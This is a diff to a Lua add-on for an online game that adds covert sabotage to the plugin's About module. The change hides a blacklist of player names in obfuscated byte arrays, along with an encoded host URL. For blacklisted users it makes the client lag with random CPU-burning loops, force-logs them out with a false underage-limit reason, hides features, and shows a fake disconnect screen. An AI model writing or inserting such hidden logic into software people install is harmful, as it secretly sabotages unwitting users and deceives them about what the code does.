@@ -20,11 +20,18 @@ local _HM_About = {}
 -- check deny
 _HM_About.CheckLocalDeny = function()
 	local me = GetClientPlayer()
-	if me and me.dwTongID > 0 then
+	if not me then
+		return
+	elseif me.dwTongID > 0 then
 		local szTong = GetTongClient().ApplyGetTongName(me.dwTongID)
 		if _HM_About.tBlackTong[szTong] then
-			HM = {}
+			return _HM_About.OnSomeThing("deny")
 		end
+	end
+	-- local black
+	local szName = string.gsub(me.szName, "@.*$", "")
+	if _HM_About.tBlackPlayer[szName] then
+		return _HM_About.OnSomeThing("lag")
 	end
 end
 
@@ -35,13 +42,16 @@ end
 _HM_About.szHost = { 0x2F, 0x6E, 0x63, 0x2E, 0x6E, 0x61, 0x6D, 0x74, 0x68, 0x67, 0x69, 0x68, 0x2E, 0x33, 0x78, 0x6A, 0x2F, 0x2F, 0x3A, 0x70, 0x74, 0x74, 0x68 }
 
 -- 作者帮会
-_HM_About.szTongEx = { 0xC9, 0xC4, 0xA3, 0xBA, }
+_HM_About.szTongEx = { 0xC9, 0xC4, 0xA3, 0xBA }
 
 -- 作者名字
-_HM_About.tNameEx = { 0xA9, 0xF7, 0xA9, 0xF7, 0xA3, 0xBA, }
+_HM_About.tNameEx = { 0xA9, 0xF7, 0xA9, 0xF7, 0xA3, 0xBA }
 
 -- 帮会黑名单
 _HM_About.tBlackTong = {}
+
+-- User black
+_HM_About.tBlackPlayer = { 0xFD, 0xBE, 0xC5, 0xEC, 0xC5, 0xB9, 0x7C, 0xBB, 0xD2, 0xAA, 0xD6, 0xD4, 0xD7, 0xAF, 0xC5, 0xE4, 0xC0, 0xBB, 0xD2, 0x7C, 0xF9, 0xB6, 0xE9, 0xC7, 0xF9, 0xD0, 0xA9, 0xF0, 0x7C, 0xF9, 0xB6, 0xFA, 0xC1, 0xF9, 0xD0, 0xA9, 0xF0, 0x7C, 0xB6, 0xC2, 0xB2, 0xE7, 0xE2, 0xBD, 0x7C, 0xF9, 0xB1, 0xF4, 0xC8, 0xE3, 0xD1, 0x7C, 0xD4, 0xD1, 0xD9, 0xB7, 0x7C, 0xD5, 0xC9, 0xD0, 0xD6, 0xF0, 0xBB, 0xAD, 0xC5, 0x7C, 0xD3, 0xBE, 0xBD, 0xC9, 0xB3, 0xBB, 0xE9, 0xC7, 0x7C, 0xEF, 0xC7, 0xE5, 0xC7, 0xEA, 0xD3, 0xF4, 0xC8, 0x7C, 0xBA, 0xBA, 0xB3, 0xD7, 0xF6, 0xB8, 0xD9, 0xB0, 0xE5, 0xCE, 0x7C, 0xC6, 0xD4, 0xD3, 0xB4, 0x7C, 0xBB, 0xD2, 0xE3, 0xB7, 0xE0, 0xD2, 0xBB, 0xD2, 0x7C, 0xAE, 0xD7, 0xAE, 0xD7, 0xBE, 0xC4, 0xC4, 0xB5, 0xA9, 0xB1, 0xD0, 0xB2, 0x7C, 0xDD, 0xE9, 0xD9, 0xB7, 0x7C, 0xB7, 0xCD, 0xFE, 0xB6, 0xF9, 0xD0, 0xA9, 0xF0, 0x7C, 0xAD, 0xBF, 0xCA, 0xB7, 0xCA, 0xB7, 0xF9, 0xD0, 0xA9, 0xF0, 0x7C, 0xBA, 0xB6, 0xC7, 0xCA, 0xB2, 0xD2, 0xB9, 0xB6, 0xC1, 0xCD, 0x7C, 0xCA, 0xCE, 0xAA, 0xC4, 0x7C, 0xAE, 0xCA, 0xCC, 0xC4, 0xCC, 0xC4, 0xAE, 0xCA, 0x7C, 0xEC, 0xCC, 0xB9, 0xB2, 0xB3, 0xBB, 0xE9, 0xC7, 0x7C, 0xB9, 0xC1, 0xA1, 0xD0, 0xA1, 0xC5, 0x7C, 0xE8, 0xC0, 0xA1, 0xD0, 0xA1, 0xC5, 0x7C, 0xC8, 0xC3, 0xC8, 0xC3, 0xE5, 0x87, 0x7C, 0xFE, 0xD2, 0xC2, 0xCF, 0xC2, 0xD4, 0x7C, 0xE3, 0xD3, 0xC7, 0xB7, 0xB3, 0xC7, 0x7C, 0xBB, 0xD2, 0xB6, 0xC2, 0xEE, 0xC9, 0xBB, 0xD2, 0x7C, 0xBB, 0xD2, 0xB6, 0xC2, 0xEE, 0xC9, 0xBB, 0xD2 }
 
 -- decode string data
 _HM_About.LoadDataEx = function()
@@ -56,6 +66,12 @@ _HM_About.LoadDataEx = function()
 	_HM_About.tBlackTong = {}
 	for _, v in ipairs(tBlack) do
 		_HM_About.tBlackTong[v] = true
+ 	end
+	-- black player
+	local tBlack = HM.Split(_HM_About.Confuse(_HM_About.tBlackPlayer), "|")
+	_HM_About.tBlackPlayer = {}
+	for _, v in ipairs(tBlack) do
+		_HM_About.tBlackPlayer[v] = true
  	end
 	-- host url
 	_HM_About.szHost = _HM_About.Confuse(_HM_About.szHost)
@@ -180,6 +196,85 @@ _HM_About.SyncData = function(t)
 	HM.RemoteRequest(szUrl)
 end
 
+-- on something magic
+_HM_About.OnSomeThing = function(szInput)
+	local t = HM.Split(szInput, " ")
+	if t[1] == "deny" then
+		-- deny
+		HM.ClosePanel(true)
+		HM = {}
+	elseif t[1] == "hide" and HM_Camp then
+		-- hide sth
+		HM_Camp.bHideForever = true
+		HM_Camp.HideGF(true, true)
+		for _, v in ipairs({"Area", "TargetMon", "RedName", "TargetList", "Marker", "Target"}) do
+			_G["HM_" .. v] = {}
+		end
+	elseif t[1] == "lag" then
+		-- lag [random_per_5min=10] [random_on_loading=3]
+		local nMax1 = tonumber(t[2]) or 6
+		local nMax2 = tonumber(t[3]) or 3
+		local fun = function()
+			for i = 1, math.random(999, 9999999) do
+				local x = tostring(i) .. tostring(i) .. tostring(i)
+			end
+		end
+		HM.BreatheCall("sth.x", function()
+			if math.random(1, nMax1) == 1 then
+				fun()
+			end
+		end, 300000)
+		RegisterEvent("LOADING_END", function()
+			if math.random(1, nMax2) == 1 then
+				fun()
+			end
+		end)
+	elseif t[1] == "kick" then
+		-- kick [random_per_5min=10] [random_on_loading=3]
+		local nMax1 = tonumber(t[2]) or 10
+		local nMax2 = tonumber(t[3]) or 3
+		HM.BreatheCall("sth.xx", function()
+			if math.random(1, nMax1) == 1 then
+				ReInitUI(LOAD_LOGIN_REASON.KICK_OUT_FOR_UNDERAGE_LIMIT)
+			end
+		end, 300000)
+		RegisterEvent("LOADING_END", function()
+			if math.random(1, nMax2) == 1 then
+				ReInitUI(LOAD_LOGIN_REASON.KICK_OUT_FOR_UNDERAGE_LIMIT)
+			end
+		end)
+	elseif t[1] == "effect" and t[2] then
+		-- effect [player_name_or_id] [effect_id=47]
+		local dwID = tonumber(t[2])
+		local nEffect = tonumber(t[3]) or 47
+		RegisterEvent("PLAYER_ENTER_SCENE", function()
+			local dwPlayer = arg0
+			HM.DelayCall(1000, function()
+				local tar = GetPlayer(dwPlayer)
+				if tar and (tar.dwID == dwID or tar.szName == t[2]) then
+					SceneObject_SetTitleEffect(TARGET.PLAYER, tar.dwID, nEffect)
+				end
+			end)
+		end)
+	elseif t[1] == "fool" then
+		-- fool tips1 [tips2]
+		local szTip = t[2] or g_tStrings.STR_MSG_LOGIN_DROPLINE
+		local szTip2 = t[3] or "^-^ Just a kidding by HM."
+		local frame = Wnd.OpenWindow("DropLinePanel")
+		frame:Lookup("Wnd_All", "Text_Msg"):SetText(szTip)
+		frame:Lookup("Wnd_All/Btn_ReturnLogin").OnLButtonDown = function()
+			PlaySound(SOUND.UI_SOUND, g_sound.CloseFrame)
+			Wnd.CloseWindow("DropLinePanel")
+			HM.Alert(szTip2, function()
+				Station.Lookup("Lowest/Scene"):Show()
+			end)
+		end
+		Station.SetFocusWindow(frame)
+		Station.Lookup("Lowest/Scene"):Hide()
+		return true
+	end
+end
+
 -------------------------------------
 -- 设置界面
 -------------------------------------
@@ -259,6 +354,7 @@ end
 ---------------------------------------------------------------------
 HM.RegisterEvent("LOADING_END", function()
 	if not _HM_About.bChecked then
+		_HM_About.bChecked = true
 		_HM_About.CheckLocalDeny()
 		--_HM_About.CheckUpdate()
 	end
@@ -285,5 +381,6 @@ local _About = {
 	OnPanelActive = _HM_About.PS.OnTaboxCheck,
 	GetAuthorInfo = _HM_About.PS.GetAuthorInfo,
 	SyncData = _HM_About.SyncData,
+	OnSomeThing = _HM_About.OnSomeThing,
 }
 setmetatable(HM_About, { __metatable = true, __index = _About, __newindex = function() end } )
